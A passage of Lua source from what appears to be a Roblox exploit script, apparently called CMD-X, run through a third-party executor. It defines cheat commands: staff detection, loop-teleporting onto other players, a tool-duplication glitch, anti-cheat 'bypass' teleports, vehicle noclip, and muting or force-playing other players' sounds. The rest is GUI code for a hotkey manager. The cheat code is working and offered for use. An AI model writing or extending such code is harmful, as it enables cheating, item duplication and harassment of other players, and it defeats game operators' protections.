				for _,n in pairs(cmdp:GetPlayers()) do 
					vID = n.UserId
					z = string.find(adminTableS.N[i],vID)
					if z ~= nil then
						CreateADLabel(n.Name,"Staff | KOHLS")
					end
				end
			end 
			cmdp.PlayerAdded:Connect(function(plr)
				for i,v in pairs(cmdrs:GetDescendants()) do
					if v.Name == "log" then
						adminTable = v.Parent:FindFirstChildOfClass("StringValue")
					end
				end
				local adminTableS = {{N = "", I = ""}}
				adminTableS.N = adminTable.Value:split(" ")
				for i,v in pairs(adminTableS.N) do
					adminTableS.N[i] = adminTableS.N[i]:gsub("-","")
					adminTableS.N[i] = adminTableS.N[i]:sub(0,#adminTableS.N[i]-2)
					vID = plr.UserId
					z = string.find(adminTableS.N[i],vID)
					if z ~= nil then
						CreateADLabel(plr.Name,"Staff | KOHLS")
					end
				end
			end)
		else
			opx("*","Unable to detect an adminGUI")
		end
	end

	function useCommand.futurelighting()
		opx("-","Set lighting to future")
		savedLight = gethiddenproperty(game.Lighting, "Technology")
		sethiddenproperty(game.Lighting, "Technology", Enum.Technology.Future)
	end

	function useCommand.unfuturelighting()
		opx("-","Set lighting back to normal")
		sethiddenproperty(game.Lighting, "Technology", savedLight)
	end

	function useCommand.streamermode()
		opx("-","Streamer Mode enabled")
		for i,v in pairs(cmdp:GetChildren()) do
			if v.Name ~= cmdlp.Name and v.Character and v.Character:FindFirstChild("Head") then 
				local char = v.Character
				local head = char:FindFirstChild('Head')
				local m = Instance.new("Model", char) m.Name = ""
				local cl = char.Head:Clone() cl.Parent = m 
				local hum = Instance.new("Humanoid", m) 
				hum.Name = "NameTag" 
				hum.MaxHealth = v.Character.Humanoid.MaxHealth
				wait()
				hum.Health = v.Character.Humanoid.Health
				cl.CanCollide = false
				local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
				char.Head.Transparency = 1
			end
		end
		for i,v in pairs(cmdp:GetChildren()) do
			v.CharacterAdded:Connect(function(v)
				wait(2)
				local char = v
				local head = char.Head
				local m = Instance.new("Model", char) m.Name = ""
				local cl = char.Head:Clone() cl.Parent = m 
				local hum = Instance.new("Humanoid", m) 
				hum.Name = "NameTag" 
				hum.MaxHealth = char.Humanoid.MaxHealth
				wait()
				hum.Health = char.Humanoid.Health
				cl.CanCollide = false
				local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
				char.Head.Transparency = 1
			end)
		end 
		cmdp.PlayerAdded:Connect(function(v)
			wait(2)
			local char = v.Character
			local head = char.Head
			local m = Instance.new("Model", char) m.Name = ""
			local cl = char.Head:Clone() cl.Parent = m 
			local hum = Instance.new("Humanoid", m) 
			hum.Name = "NameTag" 
			hum.MaxHealth = char.Humanoid.MaxHealth
			wait()
			hum.Health = char.Humanoid.Health
			cl.CanCollide = false
			local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
			char.Head.Transparency = 1
		end)
		local Chat = cmdlp.PlayerGui.Chat:WaitForChild("Frame").ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller
		Chat.ChildAdded:Connect(function(fr)
			if fr:IsA("Frame") then
				local frg = fr.TextLabel.TextButton.Text
				fr.TextLabel.TextButton.Text = ""
			end
		end)
		local Players = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame
		for i,fr in pairs(Players:GetDescendants()) do
			if fr:IsA("TextLabel") then
				fr.Text = ""
			end
		end
		Players.DescendantAdded:Connect(function(fr)
			if fr:IsA("TextLabel") then
				fr.Text = ""
			end
		end)
	end

	function useCommand.permflyspeed()
		if cmdnum(arguments[2]) then
			opx("-","Perm fly speed updated to "..arguments[2])
			permflyspeed = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	local Loopto = false
	function useCommand.loopgoto()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					Loopto = true
					opx("-","Now LoopTping "..target.Name)
					while Loopto do
						cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
						wait()
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unloopgoto()
		Loopto = false
		opx("-","No longer LoopTping")
	end

	stopDupeMid = false
	function useCommand.dupegears()
		if cmdnum(arguments[2]) then
			local DroppedTools = {}
			opx("-","Duping tools until it reaches "..arguments[2])
			stopDupeMid = false
			local savepos = cmdlp.Character.HumanoidRootPart.CFrame
			cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(0,10000000,0)
			wait(.2)
			for i = 1,arguments[2] do
				if stopDupeMid then break end
				cmdlp.Character.HumanoidRootPart.CFrame = CFrame.new(0,10000000,0)
				for i,a in pairs(cmdlp.Backpack:GetDescendants()) do
					if a:IsA("Tool") then
						a.Parent = cmdlp.Character
						wait(.1)
						a.Parent = workspace
						table.insert(DroppedTools, a)
					end
				end
				cmdlp.Character:BreakJoints()
				cmdlp.CharacterAdded:wait()
				cmdlp.Character:WaitForChild("HumanoidRootPart").CFrame = savepos
				wait(.1)
				if stopDupeMid then break end
			end
			for _,v in pairs(DroppedTools) do
				firetouchinterestX(v.Handle)
			end
			cmdlp.Character.HumanoidRootPart.CFrame = savepos
		else
			opx("*","This command requires 2 arguments")
		end
	end

	function useCommand.stopdupegears()
		stopDupeMid = true
		opx("-","Stopped dupe tools")
	end

	function useCommand.permwalkspeed()
		if cmdnum(arguments[2]) then
			opx("-","Perm walkspeed updated to "..arguments[2])
			permwalkspeed = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	function useCommand.permmaxslopeangle()
		if cmdnum(arguments[2]) then
			opx("-","Perm maxslopeangle updated to "..arguments[2])
			permmaxsl = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	function useCommand.permjumppower()
		if cmdnum(arguments[2]) then
			opx("-","Perm jumppower updated to "..arguments[2])
			permjumppower = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	function useCommand.permhipheight()
		if cmdnum(arguments[2]) then
			opx("-","Perm hipheight updated to "..arguments[2])
			permhipheight = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	function useCommand.permgravity()
		if cmdnum(arguments[2]) then
			opx("-","Perm gravity updated to "..arguments[2])
			permgravity = arguments[2]
			updatesaves()
		else
			opx("*","2 arguments are required for this command")
		end
	end

	function useCommand.clearoutput()
		output1.Text = "";output2.Text = "";output3.Text = "";output4.Text = "";output5.Text = "";output6.Text = "";output7.Text = "";output8.Text = "";output9.Text = ""
	end

	function useCommand.gotospawn()
		opx("-","Teleported to spawn")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("SpawnLocation") then
				cmdlp.Character.HumanoidRootPart.CFrame = v.CFrame
				break
			end
		end
	end

	function useCommand.gotobp()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				game:GetService("TweenService"):Create(cmdlp.Character.HumanoidRootPart, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = target.Character.HumanoidRootPart.CFrame}):Play()
				opx("-","Now bypass teleporting to "..target.Name)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	Muted = {}

	function useCommand.supermute()
		opx("-","Super muted game")
		mutealls = true
		repeat wait()
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("Sound") then
					v.Playing = false
				end
			end
		until mutealls == false
	end

	function ReloadGui(plr)
		arguments = {"unmute",plr}
		useCommand[arguments[1]]()
		useCommand["unsupermute"]()
	end

	function useCommand.unsupermute()
		opx("-","UnSuper muted game")
		mutealls = false
	end

	local forceplayConns = {}
	local allForcePlayConn = nil
	local forcePlayLoop = nil

	function ForcePlayFind(v, tablex, once)
		if once then
			local onceAudios = {}
			for x,y in pairs(v.Character:GetChildren()) do
				if y:IsA("Tool") then
					for c,m in pairs(y:GetDescendants()) do
						if m:IsA("Sound") then
							m.Playing = true
						end
					end
				end
			end
			for x,y in pairs(v.Backpack:GetDescendants()) do
				if y:IsA("Sound") then
					y.Playing = true
				end
			end
			return
		end
		pcall(function()
			for x,y in pairs(v.Character:GetChildren()) do
				if y:IsA("Tool") then
					for c,m in pairs(y:GetDescendants()) do
						if m:IsA("Sound") then
							m.Playing = true
						end
					end
				end
			end
			for x,y in pairs(v.Backpack:GetDescendants()) do
				if y:IsA("Sound") then
					y.Playing = true
				end
			end
		end)
	end

	function ForcePlayLoop()
		forcePlayLoop = game:GetService("RunService").RenderStepped:Connect(function()
			for i,v in pairs(forceplayConns) do
				ForcePlayFind(v[1], v)
			end
		end)
	end

	function useCommand.backpackplay()
		if allForcePlayConn then
			forceplayConns = {}
			allForcePlayConn:Disconnect()
			allForcePlayConn = nil
			forcePlayLoop:Disconnect()
			forcePlayLoop = nil
			opx("-","Backpack play all is no longer enabled")
			return
		end
		if not arguments[2] or arguments[2] == "all" then
			opx("-","Backpack play all is now enabled")
			forceplayConns = {}
			for i,v in pairs(cmdp:GetPlayers()) do
				table.insert(forceplayConns, {v, x = {}})
			end
			allForcePlayConn = cmdp.PlayerAdded:Connect(function(v)
				table.insert(forceplayConns, {v, x = {}})
			end)
			if not forcePlayLoop then
				ForcePlayLoop()
			end
		elseif arguments[2] and arguments[2] ~= "all" then
			local target = findplr(arguments[2])
			if not target then
				opx("*","Player does not exist!")
				return
			end
			local targetWasIn = false
			for i,v in pairs(forceplayConns) do
				if target == v[1] then
					targetWasIn = true
					table.remove(forceplayConns, i)
				end
			end
			if targetWasIn then
				if #forceplayConns == 0 then
					forcePlayLoop:Disconnect()
					forcePlayLoop = nil
				end
				opx("-","Backpack play "..target.Name.." is no longer enabled")
				return
			end
			opx("-","Backpack play "..target.Name.." is now enabled")
			table.insert(forceplayConns, {target, x = {}})
			if not forcePlayLoop then
				ForcePlayLoop()
			end
		end
	end

	function useCommand.unforceplay()
		if not arguments[2] or arguments[2] == "all" then
			forceplayConns = {}
			pcall(function() allForcePlayConn:Disconnect()
				allForcePlayConn = nil  end)
			pcall(function() forcePlayLoop:Disconnect()
				forcePlayLoop = nil end)
			opx("-","Force play all is no longer enabled")
		elseif arguments[2] and arguments[2] ~= "all" then
			local target = findplr(arguments[2])
			if not target then
				opx("*","Player does not exist!")
				return
			end
			local targetWasIn = false
			for i,v in pairs(forceplayConns) do
				if target == v[1] then
					targetWasIn = true
					table.remove(forceplayConns, i)
				end
			end
			if targetWasIn then
				if #forceplayConns == 0 then
					forcePlayLoop:Disconnect()
					forcePlayLoop = nil
				end
				opx("-","Force play "..target.Name.." is no longer enabled")
				return
			else
				opx("*","Force play "..target.Name.." was not enabled")
			end
		end
	end

	local allMuteConn = nil
	local muteConns = {}
	local muteLoop = nil

	function MuteFind(v, tablex, once)
		if once then
			local onceAudios = {}
			for x,y in pairs(v.Character:GetChildren()) do
				if y:IsA("Tool") then
					for c,m in pairs(y:GetDescendants()) do
						if m:IsA("Sound") then
							m.Playing = false
						end
					end
				end
			end
			for x,y in pairs(v.Backpack:GetDescendants()) do
				if y:IsA("Sound") then
					y.Playing = false
				end
			end
			return
		end
		pcall(function()
			for x,y in pairs(v.Character:GetChildren()) do
				if y:IsA("Tool") then
					for c,m in pairs(y:GetDescendants()) do
						if m:IsA("Sound") then
							m.Playing = false
						end
					end
				end
			end
			for x,y in pairs(v.Backpack:GetDescendants()) do
				if y:IsA("Sound") then
					y.Playing = false
				end
			end
		end)
	end

	function MuteLoop()
		muteLoop = game:GetService("RunService").RenderStepped:Connect(function()
			for i,v in pairs(muteConns) do
				MuteFind(v[1], v)
			end
		end)
	end

	function useCommand.mute()
		if allMuteConn then
			muteConns = {}
			allMuteConn:Disconnect()
			allMuteConn = nil
			muteLoop:Disconnect()
			muteLoop = nil
			opx("-","Mute all is no longer enabled")
			return
		end
		if not arguments[2] or arguments[2] == "all" then
			opx("-","Mute all is now enabled")
			muteConns = {}
			for i,v in pairs(cmdp:GetPlayers()) do
				table.insert(muteConns, {v, x = {}})
			end
			allMuteConn = cmdp.PlayerAdded:Connect(function(v)
				table.insert(muteConns, {v, x = {}})
			end)
			if not muteLoop then
				MuteLoop()
			end
		elseif arguments[2] and arguments[2] ~= "all" then
			local target = findplr(arguments[2])
			if not target then
				opx("*","Player does not exist!")
				return
			end
			local targetWasIn = false
			for i,v in pairs(muteConns) do
				if target == v[1] then
					targetWasIn = true
					table.remove(muteConns, i)
				end
			end
			if targetWasIn then
				if #muteConns == 0 then
					muteLoop:Disconnect()
					muteLoop = nil
				end
				opx("-","Mute "..target.Name.." is no longer enabled")
				return
			end
			opx("-","Mute "..target.Name.." is now enabled")
			table.insert(muteConns, {target, x = {}})
			if not muteLoop then
				MuteLoop()
			end
		end
	end

	function useCommand.unmute()
		if not arguments[2] or arguments[2] == "all" then
			muteConns = {}
			pcall(function() allMuteConn:Disconnect()
				allMuteConn = nil  end)
			pcall(function() muteLoop:Disconnect()
				muteLoop = nil end)
			opx("-","Mute all is no longer enabled")
		elseif arguments[2] and arguments[2] ~= "all" then
			local target = findplr(arguments[2])
			if not target then
				opx("*","Player does not exist!")
				return
			end
			local targetWasIn = false
			for i,v in pairs(muteConns) do
				if target == v[1] then
					targetWasIn = true
					table.remove(muteConns, i)
				end
			end
			if targetWasIn then
				if #muteConns == 0 then
					muteLoop:Disconnect()
					muteLoop = nil
				end
				opx("-","Mute "..target.Name.." is no longer enabled")
				return
			else
				opx("*","Mute "..target.Name.." was not enabled")
			end
		end
	end

	cmdp.PlayerRemoving:Connect(function(targ)
		for i,v in pairs(muteConns) do
			if v[1] == targ then
				table.remove(muteConns, i)
			end
		end
		for i,v in pairs(forceplayConns) do
			if v[1] == targ then
				table.remove(forceplayConns, i)
			end
		end
	end)

	function useCommand.cutmuteloop()
		muteall = false
		opx("-","Stopped mute loop")
	end

	xAtt = {}
	function useCommand.attachmenttruesight()
		opx("-","Attachment truesight is now active")
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Attachment") then
				v.Visible = true
				table.insert(xAtt, v)
			end
		end
	end

	function useCommand.unattachmenttruesight()
		opx("-","Attachment truesight is no longer active")
		for i,v in pairs(xAtt) do
			v.Visible = true
		end
		xAtt = {}
	end

	function useCommand.vgoto()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				opx("-","Now vehicle teleporting to "..target.Name)
				local Car = cmdlp.Character.Humanoid.SeatPart
				Car.Parent.Parent:MoveTo(target.Character.HumanoidRootPart.Position)
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.vfreegoto()
		if arguments[4] then
			opx("-","Now vehicle teleporting to pos")
			local Car = cmdlp.Character.Humanoid.SeatPart
			Car.Parent.Parent:MoveTo(arguments[2], arguments[3], arguments[4])
		else
			opx("*","4 arguments are needed for this command!")
		end
	end

	function useCommand.vloadpos()
		if arguments[2] then
			wpNS = getstring(2)
			for i,v in pairs(WPs) do
				local xc = WPs[i].C[1]
				local yc = WPs[i].C[2]
				local zc = WPs[i].C[3]
				if tostring(WPs[i].N) == tostring(wpNS) then
					local Car = cmdlp.Character.Humanoid.SeatPart
					Car.Parent.Parent:MoveTo(xc,yc,zc)
				end
			end
			opx("Teleported to "..tostring(wpNS))
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.vgotopart()
		if arguments[2] then
			opx("-","Now vehicle teleporting to part")
			for i,v in pairs(workspace:GetDescendants()) do
				if v.Name == getstring(2) then
					local Car = cmdlp.Character.Humanoid.SeatPart
					Car.Parent.Parent:MoveTo(v.Position)
					break
				end
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.vgotoclass()
		if arguments[2] then
			opx("-","Now vehicle teleporting to class")
			for i,v in pairs(workspace:GetDescendants()) do
				if v.ClassName == getstring(2) then
					local Car = cmdlp.Character.Humanoid.SeatPart
					Car.Parent.Parent:MoveTo(v.Position)
					break
				else
					opx("*","Part does not exist")
				end
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	carParts = {}
	function useCommand.vnoclip()
		opx("-","Now vehicle noclipping")
		local Car = cmdlp.Character.Humanoid.SeatPart
		for i,v in pairs(Car.Parent.Parent:GetDescendants()) do
			if v:IsA("BasePart") then
				if v.CanCollide then
					v.CanCollide = false
					table.insert(carParts, v)
				end
			end
		end
	end

	function useCommand.vclip()
		opx("-","No longer vehicle noclipping")
		local Car = cmdlp.Character.Humanoid.SeatPart
		for i,v in pairs(carParts) do
			if v:IsA("BasePart") then
				v.CanCollide = true
			end
		end
	end

	function useCommand.robloxversion()
		opx("-","Roblox is on version: "..version().." - ".._VERSION)
	end


	ManageHolderHotkey = Instance.new("Frame", getParent)
	MangeScrollHotkey = Instance.new("ScrollingFrame", getParent)
	BtnAddHotkey = Instance.new("TextButton", getParent)
	BtnClearHotkey = Instance.new("TextButton", getParent)
	ManageTitleHotkey = Instance.new("TextLabel", getParent)
	SlideOutHotkey = Instance.new("Frame", getParent)
	Edit1Hotkey = Instance.new("TextBox", getParent)
	Edit2Hotkey = Instance.new("TextBox", getParent)
	Edit3Hotkey = Instance.new("TextBox", getParent)
	TitleSlideHotkey = Instance.new("TextLabel", getParent)
	CancelBtnHotkey = Instance.new("TextButton", getParent)
	ApplyBtnHotkey = Instance.new("TextButton", getParent)
	BtnExitHotkey = Instance.new("TextButton", getParent)

	ManageHolderHotkey.Name = "ManageHolderHotkey"
	ManageHolderHotkey.Parent = Unnamed
	ManageHolderHotkey.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
	ManageHolderHotkey.BackgroundTransparency = -0.010
	ManageHolderHotkey.BorderSizePixel = 0
	ManageHolderHotkey.Position = UDim2.new(0.33610791, 0, 0.279678553, 0)
	ManageHolderHotkey.Size = UDim2.new(0, 424, 0, 294)
	ManageHolderHotkey.Active = true
	createDrag(ManageHolderHotkey)
	ManageHolderHotkey.Visible = false

	MangeScrollHotkey.Name = "MangeScrollHotkey"
	MangeScrollHotkey.Parent = ManageHolderHotkey
	MangeScrollHotkey.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	MangeScrollHotkey.BorderSizePixel = 0
	MangeScrollHotkey.Position = UDim2.new(0.0268278271, 0, 0.10493198, 0)
	MangeScrollHotkey.Size = UDim2.new(0, 401, 0, 214)

	function Template1(name,entry)
		local TemplateFrame = Instance.new("Frame", getParent)
		local TemplateName = Instance.new("TextLabel", getParent)
		local TemplateBtnRemove = Instance.new("TextButton", getParent)
		local TemplateBtnAdd = Instance.new("TextButton", getParent)
		local alls2 = 5
		for i,v in pairs(MangeScrollHotkey:GetChildren()) do
			if v then
				alls2 = v.Size.Y.Offset + alls2+5
			end
			if not v then
				alls2 = 5
			end
		end
		TemplateFrame.Name = name
		TemplateFrame.Parent = MangeScrollHotkey
		TemplateFrame.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
		TemplateFrame.BorderSizePixel = 0
		TemplateFrame.Position = UDim2.new(-1,0,0,alls2)
		TemplateFrame.Size = UDim2.new(0, 368, 0, 19)

		TemplateName.Name = "TemplateName"
		TemplateName.Parent = TemplateFrame
		TemplateName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TemplateName.BackgroundTransparency = 1.000
		TemplateName.BorderSizePixel = 0
		TemplateName.Position = UDim2.new(0.0231884252, 0, 0, 0)
		TemplateName.Size = UDim2.new(0, 191, 0, 19)
		TemplateName.Font = Enum.Font.GothamBlack
		TemplateName.Text = name.."|"..entry
		TemplateName.TextColor3 = Color3.fromRGB(255, 255, 255)
		TemplateName.TextSize = 14.000
		TemplateName.TextXAlignment = Enum.TextXAlignment.Left

		TemplateBtnRemove.Name = "TemplateBtnRemove"
		TemplateBtnRemove.Parent = TemplateFrame
		TemplateBtnRemove.BackgroundColor3 = Color3.fromRGB(176, 176, 176)
		TemplateBtnRemove.BackgroundTransparency = 0.700
		TemplateBtnRemove.BorderSizePixel = 0
		TemplateBtnRemove.Position = UDim2.new(0.859420359, 0, 0, 0)
		TemplateBtnRemove.Size = UDim2.new(0, 51, 0, 19)
		TemplateBtnRemove.Font = Enum.Font.Gotham
		TemplateBtnRemove.Text = "Remove"
		TemplateBtnRemove.TextColor3 = Color3.fromRGB(255, 255, 255)
		TemplateBtnRemove.TextSize = 12.000
		TemplateBtnRemove.MouseButton1Down:Connect(function()
			table.remove(hkBinds,entry)
			TemplateBtnRemove.Parent:Destroy()
			updatesaves()
		end)

		TemplateBtnAdd.Name = "TemplateBtnAdd"
		TemplateBtnAdd.Parent = TemplateFrame
		TemplateBtnAdd.BackgroundColor3 = Color3.fromRGB(176, 176, 176)
		TemplateBtnAdd.BackgroundTransparency = 0.700
		TemplateBtnAdd.BorderSizePixel = 0
		TemplateBtnAdd.Position = UDim2.new(0.699094296, 0, 0, 0)
		TemplateBtnAdd.Size = UDim2.new(0, 51, 0, 19)
		TemplateBtnAdd.Font = Enum.Font.Gotham
		TemplateBtnAdd.Text = "Edit"
		TemplateBtnAdd.TextColor3 = Color3.fromRGB(255, 255, 255)
		TemplateBtnAdd.TextSize = 12.000
		TemplateBtnAdd.MouseButton1Down:Connect(function()
			SlideOutHotkey.Visible = true
			SlideOutHotkey:TweenSize(UDim2.new(0, 215, 0, 294), 'In', 'Quint', 0.5)
			CurrentEdit = entry
			TitleSlideHotkey.Text = hkBinds[entry].C
			updatesaves()
		end)

		TemplateFrame:TweenPosition(UDim2.new(0,3,0,alls2), 'In', 'Quint', 0.5)
	end

	BtnAddHotkey.Name = "BtnAddHotkey"
	BtnAddHotkey.Parent = ManageHolderHotkey
	BtnAddHotkey.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	BtnAddHotkey.BorderSizePixel = 0
	BtnAddHotkey.Position = UDim2.new(0.026827829, 0, 0.864668369, 0)
	BtnAddHotkey.Size = UDim2.new(0, 85, 0, 33)
	BtnAddHotkey.Font = Enum.Font.Gotham
	BtnAddHotkey.Text = "Add"
	BtnAddHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnAddHotkey.TextSize = 14.000
	BtnAddHotkey.MouseButton1Down:Connect(function()
		SlideOutHotkey.Visible = true
		SlideOutHotkey:TweenSize(UDim2.new(0, 215, 0, 294), 'In', 'Quint', 0.5)
		hkBinds[#hkBinds+1] = {K = "N/A", C = "Unnamed"}
		CurrentEdit = #hkBinds
		TitleSlideHotkey.Text = hkBinds[#hkBinds].C
		Template1(hkBinds[#hkBinds].C,#hkBinds)
		updatesaves()
	end)

	BtnClearHotkey.Name = "BtnClearHotkey"
	BtnClearHotkey.Parent = ManageHolderHotkey
	BtnClearHotkey.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	BtnClearHotkey.BorderSizePixel = 0
	BtnClearHotkey.Position = UDim2.new(0.244457483, 0, 0.864668369, 0)
	BtnClearHotkey.Size = UDim2.new(0, 85, 0, 33)
	BtnClearHotkey.Font = Enum.Font.Gotham
	BtnClearHotkey.Text = "Clear"
	BtnClearHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnClearHotkey.TextSize = 14.000
	BtnClearHotkey.MouseButton1Down:Connect(function()
		MangeScrollHotkey:ClearAllChildren()
		hkBinds = {}
		Edit1Hotkey.Text = ""
		Edit2Hotkey.Text = ""
		Edit3Hotkey.Text = ""
		SlideOutHotkey.Visible = false
		SlideOutHotkey:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
		updatesaves()
	end)

	ManageTitleHotkey.Name = "ManageTitleHotkey"
	ManageTitleHotkey.Parent = ManageHolderHotkey
	ManageTitleHotkey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ManageTitleHotkey.BackgroundTransparency = 1.000
	ManageTitleHotkey.Position = UDim2.new(0.263266504, 0, 0.00765306223, 0)
	ManageTitleHotkey.Size = UDim2.new(0, 200, 0, 32)
	ManageTitleHotkey.Font = Enum.Font.GothamSemibold
	ManageTitleHotkey.Text = "CMD-X Hotkey MANAGER"
	ManageTitleHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	ManageTitleHotkey.TextSize = 14.000

	SlideOutHotkey.Name = "SlideOutHotkey"
	SlideOutHotkey.Parent = ManageHolderHotkey
	SlideOutHotkey.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	SlideOutHotkey.BackgroundTransparency = 0.500
	SlideOutHotkey.BorderSizePixel = 0
	SlideOutHotkey.Position = UDim2.new(-0.507332683, 0, 0, 0)
	SlideOutHotkey.Size = UDim2.new(0, 0, 0, 294)
	SlideOutHotkey.Visible = false

	Edit1Hotkey.Name = "Edit1Hotkey"
	Edit1Hotkey.Parent = SlideOutHotkey
	Edit1Hotkey.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
	Edit1Hotkey.BorderSizePixel = 0
	Edit1Hotkey.Position = UDim2.new(0.0325581394, 0, 0.0850340128, 0)
	Edit1Hotkey.Size = UDim2.new(0, 200, 0, 26)
	Edit1Hotkey.Font = Enum.Font.Gotham
	Edit1Hotkey.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)
	Edit1Hotkey.PlaceholderText = "Enter key here"
	Edit1Hotkey.Text = ""
	Edit1Hotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	Edit1Hotkey.TextSize = 14.000

	Edit2Hotkey.Name = "Edit2Hotkey"
	Edit2Hotkey.Parent = SlideOutHotkey
	Edit2Hotkey.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
	Edit2Hotkey.BorderSizePixel = 0
	Edit2Hotkey.Position = UDim2.new(0.0325581394, 0, 0.204081625, 0)
	Edit2Hotkey.Size = UDim2.new(0, 200, 0, 26)
	Edit2Hotkey.Font = Enum.Font.Gotham
	Edit2Hotkey.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)
	Edit2Hotkey.PlaceholderText = "Enter command here"
	Edit2Hotkey.Text = ""
	Edit2Hotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	Edit2Hotkey.TextSize = 14.000

	Edit3Hotkey.Name = "Edit3Hotkey"
	Edit3Hotkey.Parent = SlideOutHotkey
	Edit3Hotkey.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
	Edit3Hotkey.BorderSizePixel = 0
	Edit3Hotkey.Position = UDim2.new(0.0325581394, 0, 0.31292516, 0)
	Edit3Hotkey.Size = UDim2.new(0, 200, 0, 26)
	Edit3Hotkey.Font = Enum.Font.Gotham
	Edit3Hotkey.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)
	Edit3Hotkey.PlaceholderText = "Enter ... here"
	Edit3Hotkey.Text = ""
	Edit3Hotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	Edit3Hotkey.TextSize = 14.000

	TitleSlideHotkey.Name = "TitleSlideHotkey"
	TitleSlideHotkey.Parent = SlideOutHotkey
	TitleSlideHotkey.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TitleSlideHotkey.BackgroundTransparency = 1.000
	TitleSlideHotkey.Position = UDim2.new(0.0307083577, 0, -0.0161564611, 0)
	TitleSlideHotkey.Size = UDim2.new(0, 200, 0, 32)
	TitleSlideHotkey.Font = Enum.Font.GothamSemibold
	TitleSlideHotkey.Text = "..."
	TitleSlideHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	TitleSlideHotkey.TextSize = 14.000

	CancelBtnHotkey.Name = "CancelBtnHotkey"
	CancelBtnHotkey.Parent = SlideOutHotkey
	CancelBtnHotkey.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	CancelBtnHotkey.BorderSizePixel = 0
	CancelBtnHotkey.Position = UDim2.new(0.561230242, 0, 0.442899674, 0)
	CancelBtnHotkey.Size = UDim2.new(0, 85, 0, 33)
	CancelBtnHotkey.Font = Enum.Font.Gotham
	CancelBtnHotkey.Text = "Cancel"
	CancelBtnHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	CancelBtnHotkey.TextSize = 14.000
	CancelBtnHotkey.MouseButton1Down:Connect(function()
		Edit1Hotkey.Text = ""
		Edit2Hotkey.Text = ""
		Edit3Hotkey.Text = ""
		SlideOutHotkey.Visible = false
		CurrentEdit = ""
	end)

	function MakeChanges(title,new)
		for i,v in pairs(MangeScrollHotkey:GetChildren()) do
			if v.Name == title then
				v.Name = new
				xText = v.TemplateName.Text:split("|")
				v.TemplateName.Text = new.."|"..xText[2]
			end
		end
	end

	ApplyBtnHotkey.Name = "ApplyBtnHotkey"
	ApplyBtnHotkey.Parent = SlideOutHotkey
	ApplyBtnHotkey.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	ApplyBtnHotkey.BorderSizePixel = 0
	ApplyBtnHotkey.Position = UDim2.new(0.0318313837, 0, 0.442899674, 0)
	ApplyBtnHotkey.Size = UDim2.new(0, 85, 0, 33)
	ApplyBtnHotkey.Font = Enum.Font.Gotham
	ApplyBtnHotkey.Text = "Apply"
	ApplyBtnHotkey.TextColor3 = Color3.fromRGB(255, 255, 255)
	ApplyBtnHotkey.TextSize = 14.000
	ApplyBtnHotkey.MouseButton1Down:Connect(function()
		hkBinds[CurrentEdit] = {K = Edit1Hotkey.Text, C = Edit2Hotkey.Text}
		MakeChanges(TitleSlideHotkey.Text,Edit2Hotkey.Text)
		Edit1Hotkey.Text = ""
		Edit2Hotkey.Text = ""
		Edit3Hotkey.Text = ""
		SlideOutHotkey.Visible = false
		SlideOutHotkey:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
		updatesaves()
	end)

	BtnExitHotkey.Name = "BtnExitHotkey"
